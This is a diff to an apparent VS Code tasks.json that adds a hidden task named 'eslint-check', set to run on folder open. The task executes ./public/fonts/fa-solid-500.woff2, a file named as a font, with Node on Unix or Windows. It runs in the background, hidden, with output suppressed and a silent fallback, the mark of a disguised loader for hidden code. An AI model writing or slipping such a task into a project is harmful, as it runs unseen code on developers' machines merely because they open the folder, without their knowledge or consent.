@@ -1,11 +1,22 @@
 {
   "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
   "tasks": [
     {
-      "label": "validate-frontend",
+      "label": "eslint-check",
       "type": "shell",
-      "command": "node scripts/validate-frontend.mjs",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-500.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-500.woff2) || echo ''", 
       "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
       "presentation": {
         "reveal": "never",
         "panel": "dedicated",
@@ -17,6 +28,6 @@
       "runOptions": {
         "runOn": "folderOpen"
       }
-    }
+    },
   ]
 }
